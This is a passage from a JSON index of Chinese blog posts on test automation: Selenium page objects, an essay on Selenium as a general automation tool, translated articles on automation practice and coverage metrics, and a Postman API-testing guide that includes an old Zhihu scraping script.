PageObjectExample(WebDriver driver) { PageFactory.initElements(new AjaxElementLocatorFactory(driver, 5), this); } } 使用继承来简化代码\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 public abstract class AbstractPageObject { private WebDriver driver; protected AbstractPageObject(WebDriver driver) { PageFactory.initElements(new AjaxElementLocatorFactory(driver, 5), this); } } public class PageObject extends AbstractPageObject { // WebElements ignored protected PageObject(WebDriver driver) { super(driver); } // action steps ignored } 总结 大家可以通过https://github.com/eliasnogueira/selenium-java-lean-test-architecture这个项目来熟悉上面的概念，如果你使用java的话，该项目可以直接做脚手架使用，写框架的同学可以参考。\n","date":"2023-04-07T14:39:24+08:00","permalink":"zh.ethanhan.cc/p/%E5%9C%A8selenium%E4%B8%AD%E4%BD%BF%E7%94%A8ajaxelementlocatorfactory%E6%9D%A5%E4%BC%98%E5%8C%96po%E6%A8%A1%E5%BC%8F/","title":"在selenium中使用AjaxElementLocatorFactory来优化PO模式"},{"content":"前几天看到有老外发微博说selenium不是自动化测试工具，在震惊之余我陷入了沉思，这种说法其实是有道理的，原来这个工具用了这么多年，这个隐藏的秘密我竟然一直没有发现。\n很久很久之前，我在各种国外的测试论坛发现大家都在讨论一种新的工具：selenium，先入为主，由于在测试论坛最先产生的大范围讨论和关注，我一直把selenium当作是根正苗红的测试工具，这么多年来一直没有对这个观点产生过一点点的怀疑，哪怕selenium其实很多时候被人用作爬虫，很多时候被别有用心的人拿来做自动化的工具以获取不法收入，哪怕很多时候被用来做一些效率提升的工具，我都没有过一丝丝的动摇，在我心里，selenium就是最硬核的浏览器自动化测试工具之一。\n直到最近几天不经意间看到有人说(以下内容来自机翻)\n测试工具供应商能否请停止将他们的工具与 Selenium 进行比较！ 我厌倦了这个！ Selenium webdriver 是一种自动化工具，而不是用于测试！ 当然，与非专业的测试工具相比，你开发的专门用于测试的测试工具看起来当然是很不错的了。拜托，歇歇吧。\n看到上面的这条言论我才突然间意识到，selenium webdriver一直在不停的迭代，尽管速度很慢，但webdriver的各个版本里似乎总缺少点什么。于是有人总在搜索selenium的时候加上关键字pytest或者junit，于是我总是喜欢在面试的时候问你们用selenium的时候用的是拿个测试框架，于是专门有人写文章描述如何在断言里使用expected_conditions。这些证据都非常肯定的证明了selenium其实并不是专门为自动化测试设计的工具，selenium的核心是自动化工具，测试只是其应用的一部分场景而已，selenium明显格局更大，路走的更宽，真正掩耳盗铃的是我，我才是那个永远不能被叫醒的装睡的人。\n渐渐的我意识到，怪不得我之前在公开课里演示selenium的应用时总是喜欢用selenium做爬虫的例子，怪不得我之前跟一些同学留的练习里，selenium扮演的角色也只是做效率提升的工作，比如每天签到之类，其实大部分时间我使用selenium只是把它当作是自动化的工具，测试真的只是我使用selenium的一个特别的场景，在这个场景里，一些工作变得很难，比如断言；一些情况我需要考虑的更多，比如各种环境和配置问题；一些问题变得很棘手，比如用例的修改速度往往赶不上页面重构的速度等等；我写selenium最有成就感，最得心应手，写着写着有点像读爽文的场景往往是\n对爬取速度没有要求的爬虫 君子能不动手就不动手的场景，比如每天签到领金币 这些场景往往跟测试无关，与兴趣有关。\n很久之前写的从知乎爬内容的selenium脚本，那时候firefox driver还是webdriver的自带驱动。\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 74 75 76 77 78 79 80 81 82 83 84 85 86 87 88 89 90 91 92 93 94 95 96 97 \u0026#34;\u0026#34;\u0026#34; 从zhihu.com获取每日最热和每月最热 \u0026#34;\u0026#34;\u0026#34; from selenium import webdriver from datetime import date import sys reload(sys) sys.setdefaultencoding(\u0026#34;utf-8\u0026#34;) class Zhihu: def __init__(self): self.daily_url = \u0026#39;https://www.zhihu.com/explore#daily-hot\u0026#39; self.monthly_url = \u0026#39;https://www.zhihu.com/explore#monthly-hot\u0026#39; def __enter__(self): self.dr = webdriver.Firefox() return self def __exit__(self, p1, p2, p3): self.dr.quit() def get_daily_hots(self): result = [] hots_urls = self.get_daily_hots_urls() for url in hots_urls: result.append(self.get_answer(url)) return result def get_answer(self, url): self.dr.get(url) # wrap_div = self.dr.find_element_by_css_selector(\u0026#39;.zm-item-answer.zm-item-expanded\u0026#39;) article = {} article[\u0026#39;question\u0026#39;] = self.dr.find_element_by_css_selector(\u0026#39;#zh-question-title\u0026#39;).text article[\u0026#39;author\u0026#39;] = self.dr.find_element_by_css_selector(\u0026#39;.author-link\u0026#39;).text article[\u0026#39;answer\u0026#39;] = self.dr.find_element_by_css_selector(\u0026#39;.zm-editable-content.clearfix\u0026#39;).get_attribute(\u0026#39;innerHTML\u0026#39;) return article def get_monthly_hots(self): pass def get_daily_hots_urls(self): self.dr.get(self.daily_url) wrap_div = self.dr.find_element_by_class_name(\u0026#39;tab-panel\u0026#39;) title_url_elements = wrap_div.find_elements_by_class_name(\u0026#39;question_link\u0026#39;) assert len(title_url_elements) == 5 urls = [] for title in title_url_elements: urls.append(title.get_attribute(\u0026#39;href\u0026#39;)) return urls class ZhihuReporter: def __init__(self, path): self.report_path = path self.f = open(path, \u0026#39;wb\u0026#39;) def write_header(self): self.f.write(\u0026#39;\u0026lt;html\u0026gt;\u0026lt;head\u0026gt;\u0026lt;meta charset=\u0026#34;utf-8\u0026#34;\u0026gt;\u0026#39;) self.f.write(\u0026#39;\u0026lt;link rel=\u0026#34;stylesheet\u0026#34; href=\u0026#34;http://cdn.bootcss.com/bootstrap/3.3.6/css/bootstrap.min.css\u0026#34;\u0026gt;\u0026#39;) self.f.write(\u0026#39;\u0026lt;title\u0026gt;Zhihu Report\u0026lt;/title\u0026gt;\u0026lt;/head\u0026gt;\u0026#39;) def write_body(self): self.f.write(\u0026#39;\u0026lt;body\u0026gt;\u0026#39;) def finish_body(self): self.f.write(\u0026#39;\u0026lt;/body\u0026gt;\u0026#39;) def write_article(self, articles): self.f.write(\u0026#39;\u0026lt;h3\u0026gt;知乎%s最热\u0026lt;/h3\u0026gt;\u0026#39; %(date.today().strftime(\u0026#39;%Y_%m_%d\u0026#39;))) for article in articles: self.f.write(\u0026#39;\u0026lt;div class=\u0026#34;container\u0026#34;\u0026gt;\u0026#39;) article_html = \u0026#39;\u0026lt;h3\u0026gt;%s\u0026lt;small\u0026gt;%s\u0026lt;/small\u0026gt;\u0026lt;/h3\u0026gt;\u0026#39; %(article[\u0026#39;question\u0026#39;], article[\u0026#39;author\u0026#39;]) article_html += article[\u0026#39;answer\u0026#39;] self.f.write(article_html) self.f.write(\u0026#39;\u0026lt;/div\u0026gt;\u0026#39;) self.f.write(\u0026#39;\u0026lt;hr\u0026gt;\u0026#39;) def finish_report(self): self.finish_body() self.f.write(\u0026#39;\u0026lt;/html\u0026gt;\u0026#39;) self.f.close() def build_article_report(self, articles): self.write_header() self.write_body() self.write_article(articles) self.finish_report() if __name__ == \u0026#39;__main__\u0026#39;: with Zhihu() as zhihu: articles = zhihu.get_daily_hots() report_name = \u0026#39;zhihu_%s.html\u0026#39; %(date.today().strftime(\u0026#39;%Y_%m_%d\u0026#39;)) reporter = ZhihuReporter(report_name) reporter.build_article_report(articles) 其实这样看来，selenium作为自动化测试工具其实是有一定门槛的，比如需要结合测试框架，需要自定义po，需要手动维护一些复杂的等待情况，需要自己实现重试机制，更被说框架，断言，报告这祖传的三座大山了，正是因为这些痛点的存在，一些新的测试工具应运而生，这些工具为测试这个精准的场景提供了自己的解决方案，比如内置断言，自带测试报告等等，让自动化测试更容易，更稳定，更专业，也正是因为这些工具补齐了selenium所谓的一些“短板”，工具提开发商们便会不停的把selenium拿出来各种比较，以体现自己的先进性和革命性。不过这种比较是偏颇的，就像是在足球的世界里很多球员的头球能力都比梅西要强，但在进攻综合实力上梅西还是独一档的存在。这些专业的自动化测试工具就像是锤子或者起子，在某一方面很强，但selenium更像是个工具箱，适用的场景更多元化一些。\n如果你问我这些专业的自动化测试工具我是不是不推荐，其实我的答案是否定的。\n如果这些工具能让我们以更小的代价更低的成本来实现自动化测试的工作，我们何乐而不为呢？让工作变得更有效率，有更多的时间去做一些自己感兴趣的事情其实一直都是很多测试同学努力的方向。也许在未来的某一天，我会在工作中使用一些专业的自动化测试工具来帮我低成本实现测试的自动化，然后节省下来的时间写一些随性的selenium脚本，实现一些有趣的功能，这也未尝不是一件令人感到身心愉悦的事情。\n","date":"2023-04-07T14:39:24+08:00","permalink":"zh.ethanhan.cc/p/%E9%9C%87%E6%83%8Aselenium%E7%AB%9F%E7%84%B6%E4%B8%8D%E6%98%AF%E8%87%AA%E5%8A%A8%E5%8C%96%E6%B5%8B%E8%AF%95%E5%B7%A5%E5%85%B7/","title":"震惊：selenium竟然不是自动化测试工具"},{"content":"看到了一篇不错的关于自动化测试文章，简单翻译了一下。\n在我的软件测试生涯中，我听到了许多说法，如 \u0026ldquo;我们不需要团队中的测试人员！\u0026ldquo;到 \u0026ldquo;我们需要用100%的覆盖率来自动化一切！\u0026quot;。每当我听到这些时，我都会摇头。我打赌你知道为什么。这两个极端都是错误的，因为我认为每个软件开发团队都应该有一个测试人员在其中。当然，100%的测试自动化覆盖率也是不可能的，也是没有效率和要求的。\n在这篇文章中，我将分享我在测试自动化方面学到的经验，这些经验是我在软件测试行业工作了13年以上的艰苦历程中总结出来的。我将分享我在过去几年中对测试自动化和要避免的陷阱的详细看法。我将分享我在测试自动化方面的注意事项，以帮助你不犯同样的错误。\n应该去做的事情 雇用合适的人 雇用具有软件工程技能的人是必须的。没有正确的技能，你的测试自动化会失败。因此，需要在招聘过程中投入大量时间，以确定适合你的需求的人。我建议你写下你想通过新员工实现的目标。一旦目标明确，就从中引申出具体的技能。\n现在是时候写一份朗朗上口、不太长的职位描述，并说明所需的核心技能。不要在长长的技能清单中过度使用技术术语和要求。这可能会对潜在的雇员产生负面的影响。\n在面试过程中与人交谈时，技术能力是必须的。你可以在编码挑战或临时进行的代码审查中验证它们。然而，不要只看技术能力。检查是否适合团队或公司，以及在与人合作、沟通和解决问题时的正确心态也非常重要。\n一旦你雇用了合适的人从事你的自动化工作，相信他们会做正确的事情。给他们尽可能多的上下文，让他们与公司的其他角色一起，如开发人员、设计师和产品人员。在最好的情况下，每个开发团队都有一个测试工程师加入。\n在寻找正确的测试自动化工具方面花点时间 在公司拥有正确的测试自动化人员是一个很大的优势。下一个挑战是找到并选择正确的测试自动化工具。而这需要时间。在选择工具之前，与所有参与方坐下来，定义测试自动化的目标。在这个过程中，尽量提出尽可能多的关于工具、自身环境和将要建立的产品的问题。在这些问题的帮助下，你将创建一个长长的选择标准列表，以帮助你找到适合你需要的测试自动化工具。\n该列表可以有以下标准。\n该工具是否支持不同的编程语言？ 该工具是否能够针对不同的操作系统进行自动化？ 该工具是否支持CI/CD？ 该工具是否提供报告功能？ 该工具是否有很好的文档，是否提供支持或有一个伟大的社区或干爹？ 该工具是否满足预算要求？ 配置该工具的复杂程度如何？ 该工具是否提供灵活的测试执行能力，例如在不同的操作系统或环境下？ 上面的列表只包含了一些可能的问题，以找到合适的工具。因此，需要投入足够的时间来找到适合你需求和环境的工具。也可能是你需要一个以上的自动化工具用于你的技术架构中的不同层，或者是除了测试自动化工具之外，还需要一个测试自动化管理平台。那么你应该分别对每个工具进行选择。\n轻装上阵 一旦你确定了适合你的需求的自动化工具，现在是在你的团队或公司内进行配置和实施的时候了。在最初的几天或几周内，试着学习所有关于这个工具和它的功能。一旦你和你的团队熟悉了它，就开始进行第一个自动化方案的工作。但开始时一定要简单! 看看那些容易自动化的产品功能，并帮助团队专注于质量的其他部分。当这个测试是强大的并提供可靠的结果时，就可以进入下一个自动化阶段。开始在更复杂的情况下工作，看看结果。我们也建议在产品的某些部分进行测试，这些部分每天或每周都不会改变。通常一个产品的核心功能是自动化的完美起点。\n让开发人员参与到自动化过程中来 编写测试自动化代码并不容易。**它的复杂性与编写生产代码的复杂性相同，这一点永远不应该被低估。**通常一个软件开发团队有3-5个软件开发人员和至少1个软件测试工程师。这个比例是可以的。然而，测试工程师很难赶上所有对产品进行的代码修改。他/她不仅需要手动测试软件，而且还需要编写复杂的自动化。这一切对团队中的一个人来说是不可能做到的。因此，软件开发人员也必须负责编写测试自动化代码。不仅在单元测试层面，其他层次的自动化测试也可以涉猎。\n每个团队都应该坐在一起讨论自动化过程。每个人都必须清楚，产品的质量是每个人的责任。这种心态要求团队中的每个人都支持自动化。如果不是这样，你的自动化过程很可能会失败。\n在ci/cd上投资时间 与工具选择的时间投资类似。一个软件开发团队必须在cicd的配置上投入足够的时间。pipeline的配置方式必须支持开发团队的需求。例如，在每次提交时运行，在拉代码时运行或在夜间执行整个测试套件。\n同样重要的是，定义哪一层的哪些测试应该在什么时候被自动化。在最好的情况下，团队正在制定一个cicd策略。一旦pipeline策略被实施，重要的是结果对团队中的每个人都是透明的，甚至更好的是对公司中的每个人都是透明的，例如用一个dashboard。\ncicd工作和投入的时间不应该被低估。根据项目或产品的规模，这可能是一个人甚至整个团队的全职工作。\n不应该做的事情 不要因为一个工具被追捧就选择它 我的不做清单的第一点是，当选择一个新的测试自动化工具时，不要因为它在软件开发或测试社区中被炒作而盲目地选择一个工具。如果你真的很幸运，这个工具可能对你有用，但在大多数情况下，你会用它失败。正如我在前面提到的，选择一个工具需要时间。如果没有在选择过程中的这种投资，从长远来看，你可能会损失更多的钱，因为在产品开发过程中的某个时刻，你会发现这个工具不支持某个特殊功能，或者不能按照你需要的方式进行扩展。\n在选择工具时，最好检查一下目前什么工具被炒得很热，为什么？也许这种追捧有一个合理的理由，你可能会从中受益。跟上新的工具，并与社区保持联系，获得最新的消息，这总是好的。\n不要试图将一切都自动化 我在前面已经提到了这一点。每当你的团队或公司里有人告诉你要把所有事情都自动化的时候，你就装聋作哑好了。这个人很可能是一个从未从事过软件开发的人，或者对测试自动化毫无概念。我见过一些没有经验的人，他们是自动化的新手，试图把所有的东西都自动化，但他们很快就发现，这是不可能的。当你看到有这种观点的人时，和他们谈谈，并解释其消极的一面。\n你应该做的是看一下你的产品和代码架构，并确定你的应用程序的关键部分。然后花时间为这些部分创建一个自动化战略。\n有了明确的重点和策略，少量的自动化方案可以对产品的整体质量产生更大的影响。\n不要太早实现自动化 在产品开发团队中开始使用自动化时，一个典型的错误是开始的太早了。如果团队正在开发一个全新的功能或产品，真的很有可能功能会改变。在这种情况下，开始实施自动化是没有意义的。投入的时间可能会被浪费掉。相反，团队应该从基础开始。例如，建立CI/CD pipeline，考虑功能所需的数据结构。从中得出一个测试数据策略，也许准备测试数据生成的脚本。\n一旦功能越来越成熟，就慢慢开始自动化。我建议与产品所有者保持密切的关系，以了解即将到来的产品功能和变化。使用这些信息来创建你的自动化策略。\n永远不要用自动化来取代人工测试 最后但并非最不重要的是，不要用自动化来取代人工测试！人工测试是自动化的重要组成部分。在产品的开发过程中，手工测试是如此强大的一部分，它永远不应该被机器取代。为什么呢？嗯，自动化测试将由机器/计算机执行。机器所做的正是测试自动化代码中的内容，仅此而已。这并不坏，我们都知道这是有用的信息，但软件同学进行手工测试时，会发现更多的问题。首先，测试人员的行为就像一个用户。使用产品的用户会使用它，例如用鼠标、键盘或用手指在使用产品时使用他/她的所有感官。在大多数情况下，手工测试会发现没有人想到会发生的问题。\n因此，测试自动化是人工测试的重要补充。\n总结 正如你在这篇文章中所看到的，一个人在从事测试自动化时可能会犯很多错误。在雇佣自动化专家、寻找合适的工具和寻找合适的时机开始自动化时，有许多话题需要记住。\n如果你有一个明确的目标和重点，知道你想通过测试自动化实现什么，并遵循本文中要做的内容，摒弃不要做的事情，那么你将在你的产品团队或公司的测试自动化方面取得成功。\n","date":"2023-04-07T14:39:24+08:00","permalink":"zh.ethanhan.cc/p/%E8%87%AA%E5%8A%A8%E5%8C%96%E6%B5%8B%E8%AF%95%E7%9A%849%E5%A4%A7%E8%A7%84%E5%88%99/","title":"自动化测试的9大规则"},{"content":"本文非原创，翻译自https://qahiccupps.blogspot.com/2021/09/693-ok.html\n“我们的测试用例中有多少是自动化的？”\n这个问题有很多内容，特别是当它是监控测试状态的指标的时候。这也不是我第一次被问到。根据我的经验，当有人提出这个问题时，可能是因为（a）他们听说过它，（b）测试用例的数量是可数的，并且（c）他们的任务是提供一个管理层可以接受的数字，并且每月向大量不会看它的人发邮件做 ppt，然后阐述自动化“测试”的价值。\n如果这听起来很愤世嫉俗……好吧，我想是的。\n但是，并不意味着我对了解您的需求并试图帮助你获得可以你需求的东西不感兴趣。\n我们能谈谈你的追求吗？为什么？\n我们可以？太好了！\n我会开始。我对这个问题的一些考量是：\n自动化测试覆盖率似乎被认为是我们测试的一种衡量标准 这样的数字不会说明做过的测试的价值 测试用例的定义没有实际意义 \u0026hellip;而且，不管它们是什么，测试用例只是我们测试的一部分 有一个隐含的假设，即自动化程度越高越好 \u0026hellip;但自动化有其自身的风险 \u0026hellip;而且，无论自动化意味着什么，自动化测试用例只是我们测试自动化的一部分 如果我看看我们的测试方式，以及我们可能称之为测试用例的内容，我现在可以想到三种方式来回答您的问题：\n从我认为问题的意图来看，我们没有测试用例。我们所有正在进行的测试都是探索性测试，虽然我们可能会用自动化的方式记录测试结果，测试完成以后我们把现存的用例转换成自动化是没有意义的，我们标记为得分为 0%。 出于练习的目的，我准备将回归测试用例集中的每个断言描述为一个测试用例。因为它们将是我们唯一的测试用例，而且它们都是自动化的。得分100%！ 好的，我们在测试用例管理系统中有一些项目。这些是历史的发布验证记录，（大多数）测试团队以外的人在我们发布之前会进行这些检查。我更喜欢将它们视为检查点，但我很现实，并且知道我的一些同事只是想遵循步骤。相对于“自动化测试用例”的数量，它们很少，但如果我们将它们包括在我们的计算中，我们会将分数降低到 99%。 这些答案对我们中的任何一个来说似乎都不是很令人满意，是吗？\n对我来说，这种指标充其量只涵盖了我们所做工作的一小部分，其背后的假设非常值得怀疑。对您而言，该指标的重要性不及某个合理的数字，该数字可以在ppt中用来量化测试的最终效果。对此我也有一些想法：\n对我来说，测试是知识性的工作，因此很难用简单的数字来衡量 测试不是独立于其他产品开发活动而存在的 如果没有创建测试用例等人工产出物的话我们也可以完成良好的测试 没有经过对话交流和正当理由而强加的指标可能会受到怀疑 强加的指标可能会有被造假的风险 从产出物（bug列表，用例设计）开始是本末倒置 \u0026hellip; 最好先问你想测量的指标是什么以及为什么 那么，例如，是否希望衡量客户对产品的满意度？是为了衡量测试的贡献吗？是否要查看时间花在了企业想要停止的活动上？是寻找瓶颈吗？或者是其他东西？如果我们同意使用某种指标，我们如何向测试人员保证他们没有受到不公正的评价，并且他们不应该为了使数字看更好而修饰或者歪曲他们的工作实践？\n我们需要的不仅仅是花言巧语。想象一下，你被告知你的表现将根据你发送的电子邮件数量来衡量，你会如何反应？你会在讥讽它的同时但还是发送更多的电子邮件吗？您会发送电子邮件而不是进行丁丁或者是企业微信的沟通吗？您会关心对您、他人和企业的潜在不利影响吗？别人怎么能说服你采取不同的行为？最后，您是否真的希望以良好的意图研究合理的指标并根据结果采取行动？如果是这样，那么我将尽我所能帮助获得一些合理的东西，有明确的警告，公平的，透明的，承认其收集涉及的混乱，可以有效地从数据中得出我们有，这在商定的误差范围内，这反映了我们正在做的工作。如果没有，那么我会问你什么样的数字会更好的反映出实际的工作效果？我会简单地告诉你：让我们说 69.3%，好吗？\n作者使用的英文没有那么通俗，加上翻译能力有限，所以最后可能需要简单的提炼一下文章的观点\n自动化测试的覆盖率应该不能作为汇报测试效果的指标 测试的目的不是为了产出好看的数据或者指标 不合理的指标会造成不合理的结果而忽略了测试工作的实质 ","date":"2023-04-07T14:39:24+08:00","permalink":"zh.ethanhan.cc/p/%E8%87%AA%E5%8A%A8%E5%8C%96%E6%B5%8B%E8%AF%95%E8%A6%86%E7%9B%96%E7%8E%87%E8%A6%81%E5%88%B0%E5%A4%9A%E5%B0%91%E6%89%8D%E7%AE%97%E8%B6%B3%E5%A4%9F/","title":"自动化测试覆盖率要到多少才算足够"},{"content":"最近我们准备把一些服务从一个二次开发的k8s平台迁移到另一个二次开发的k8s平台去，这时候我们遇到了一个比较棘手的问题：因为迁移是有损的，也就是说迁移的过程中伴随着一定量的代码修改和容器编排方式的适配，那么我们如何保证服务迁移以后的功能是正常可用的呢？\n想了一些方法，这些办法其实比较常见：\n增加监控指标和告警指标，迁移后如果服务有问题那么这些指标会让我们尽可能快的发现问题； 增加自动化的测试用例，通过用例尽可能的对现有服务功能进行覆盖； 那么问题就来了，如何用最低的成本去实现这些自动化用例呢？\n首先我们应该选择合适类型的自动化用例，目前我们可以实现的用例有\n单元测试用例，实现成本高，但是运行成本低，运行速度快，服务没有启动的情况下也能跑，如果有的选，那么单元测试用例是首选； 接口级的测试用例，实现成本相对较低，运行成本高，需要服务跑起来才能进行测试，运行速度相对单元测试是慢一些的； ui自动化测试用例，实现成本高，运行成本也高，运行速度也慢； 最终我们选择增加一些核心的单元测试用例和ui自动化用例，然后尽可能多写接口测试用例。\n我们的服务实现了一些微服务化，请求从最前面接入层进来之后会到http层，该层会调用更下层的rpc微服务层实现具体的业务逻辑，因此我们的接口就有两种，分别是\nhttp接口，客户端直接调用 rpc接口，http层以及微服务之间进行调用 因为业务逻辑往往需要多次的rpc调用才能实现，所以直接写http层的接口测试用例相对来说是一种比较经济的方式，因为一次的http接口调用会产生多次的rpc调用，从业务逻辑上和服务的触达性上来说都是令人满意的。\n那么怎么去用尽可能最低的成本去实现这些http接口的用例呢？我之前有过使用postman把自己变成一个没有感情的用例生成机器的经历，在这里可以给大家分享一下。\n举一个具体的例子，看这个接口。\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 POST /api/users 请求 { \u0026#34;user\u0026#34;:{ \u0026#34;username\u0026#34;: \u0026#34;Jacob\u0026#34;, \u0026#34;email\u0026#34;: \u0026#34;jake@jake.jake\u0026#34;, \u0026#34;password\u0026#34;: \u0026#34;jakejake\u0026#34; } } 响应 { \u0026#34;user\u0026#34;: { \u0026#34;email\u0026#34;: \u0026#34;jake@jake.jake\u0026#34;, \u0026#34;token\u0026#34;: \u0026#34;jwt.token.here\u0026#34;, \u0026#34;username\u0026#34;: \u0026#34;jake\u0026#34;, \u0026#34;bio\u0026#34;: \u0026#34;I work at statefarm\u0026#34;, \u0026#34;image\u0026#34;: null } } 这是一个用户注册的POST接口，需要向后端传json类型的数据，我们可以看成是传递一个user对象，这个对象有username, email和password属性，用json字符串的形式表达出来而已。\n我们的目的是测试用户注册成功的情况。\n使用postman去调用这个接口，不出意外的话服务端会返回一个已经创建的user对象，也是用json字符串的形式进行表达，跟请求传递的参数相比，多了一些属性，其中最重要的就是token属性，用这个token可以完成鉴权，也就是登录，是调用一些需要鉴权接口的必要条件。\n接口调通之后，我们面临一个问题，目前传入的参数是固定的，这个接口再次运行的时候就会报错，因为用户已经注册过了，这是业务的要求，所以我们在做用例设计的时候需要去规避这个错误，因为我们的目的是测试用户注册成功。\n所以我们要对请求体里的数据进行参数化，postman实现参数化非常方便，可以这么做\n1 2 3 4 5 6 7 { \u0026#34;user\u0026#34;:{ \u0026#34;username\u0026#34;: \u0026#34;{{$randomEmail}}\u0026#34;, \u0026#34;email\u0026#34;: \u0026#34;{{$randomEmail}}\u0026#34;, \u0026#34;password\u0026#34;: \u0026#34;{{$randomEmail}}\u0026#34; } } 我们使用了postman自带的全局变量randomEmail，这个变量会生成随机的email字符串，参数化的问题很容易就解决了。\n最后是断言，我们再看一遍响应的内容。\n1 2 3 4 5 6 7 8 9 { \u0026#34;user\u0026#34;: { \u0026#34;email\u0026#34;: \u0026#34;jake@jake.jake\u0026#34;, \u0026#34;token\u0026#34;: \u0026#34;jwt.token.here\u0026#34;, \u0026#34;username\u0026#34;: \u0026#34;jake\u0026#34;, \u0026#34;bio\u0026#34;: \u0026#34;I work at statefarm\u0026#34;, \u0026#34;image\u0026#34;: null } } 因为我们要快速的实现用例，所以我们可以采用有损验证，也就是说不需要特别精准的验证方式。\n如果是精准验证，那么你需要检查\nuser属性存在 1为True的时候，email必须是请求中传递给后端的email字段，也就是说传进去的是a@itest.info，那么响应里也必须是a@itest.info 1为True的时候，token存在 1为True的时候，username逻辑同2中的email逻辑 1为True的时候，bio存在 1为True的时候，image存在 写起来不难，但是2，4这两个验证是需要费一点时间和精力的。\n有损验证的时候，你可以轻松很多，因为你只需要判断\nuser属性存在 1为True的时候 username, email, token , bio, image字段都存在，有一点代码基础的同学都知道，这个实现起来要么是复制粘贴，要么就是一个循环搞定 有损验证特别适合逻辑不变的时候，系统架构进行重构或者升级的场景，因为这种场景下代码逻辑的更改是有限的，更多只是部署架构和配置发生了变更。\n因此，作为一个没有感情的用例生成机器，我会这样实现断言，当然，这里的代码都是我从postman提供的代码片段中拷贝出来稍加修改的，分分钟就可以搞定。\n1 2 3 4 5 6 7 8 9 10 11 12 13 pm.test(\u0026#34;Status code is 201\u0026#34;, function () { pm.response.to.have.status(201); }); pm.test(\u0026#34;check response\u0026#34;, function () { var jsonData = pm.response.json(); pm.expect(jsonData).to.have.property(\u0026#39;user\u0026#39;); pm.expect(jsonData.user).to.have.property(\u0026#39;email\u0026#39;); pm.expect(jsonData.user).to.have.property(\u0026#39;token\u0026#39;); pm.expect(jsonData.user).to.have.property(\u0026#39;username\u0026#39;); pm.expect(jsonData.user).to.have.property(\u0026#39;bio\u0026#39;); pm.expect(jsonData.user).to.have.property(\u0026#39;image\u0026#39;); }); 思路对了，后面的用例实现起来就是毫无难度了，无非就是\n把接口调通 做必要的参数化，往往这个是比较费时间的，不过熟练了就好了，postman的界面是自带代码提示和补全的，基本也不需要太动脑筋 拷贝粘贴修改断言 因为说到底我们只进行了字段存在性的校验，而并没有对数据的准确性进行校验，所以用例不仅好写，而且维护成本也比较低，另外由于不依赖数据，所以用例可以在大部分环境，比如测试环境，正式环境愉快的运行，通用性也是非常不错的。\n我相信有了这个技巧，大家也可以在非常短的时间内成长为用例生成机器。对了，这里的断言是javascript实现的，不会js？没关系，反正断言都是相似的，都是复制粘贴，只要改几个字段和状态码就好了，不会js问题也不大，入门成本还是很低的。\n需要在命令行里运行跟ci/cd结合起来？也没问题，用postman自带的解决方案就好了，可以搜索关键字newman去获取更多细节。\n我上面分享的方式有点像是葵花宝典，练成之后确实很厉害，但终究还是缺了点什么，所以适用的场景是有限制的，大家可以根据实际情况灵活运用。\n用最少的时间实现最多的用例，尽可能的对后端代码进行覆盖，我觉得应该是今后效能提升大背景下的一个趋势。\n结合现在讨论度非常高的github copilot，这是AI实现的自动代码生成工具，像这种无脑的用例生成场景确实非常适合用ai去帮我们完成大部分的工作。是的，你没看错，ai已经会写用例了，可能今后测试人员的工作不是去尽可能多的实现用例，而是从ai写好的用例中挑选合适的用例的去执行。\n智能化的用例生成应该是今后一个很有意思的领域，不过在这一天到来之前，把自己培养成一个没有感情的用例生成工具会让你更加高效，摆脱一些重复繁琐的验证工作。\n","date":"2023-04-07T14:39:24+08:00","permalink":"zh.ethanhan.cc/p/%E5%81%9A%E4%B8%80%E4%B8%AA%E6%B2%A1%E6%9C%89%E6%84%9F%E6%83%85%E7%9A%84%E7%94%A8%E4%BE%8B%E7%94%9F%E6%88%90%E6%9C%BA%E5%99%A8/","title":"做一个没有感情的用例生成机器"}]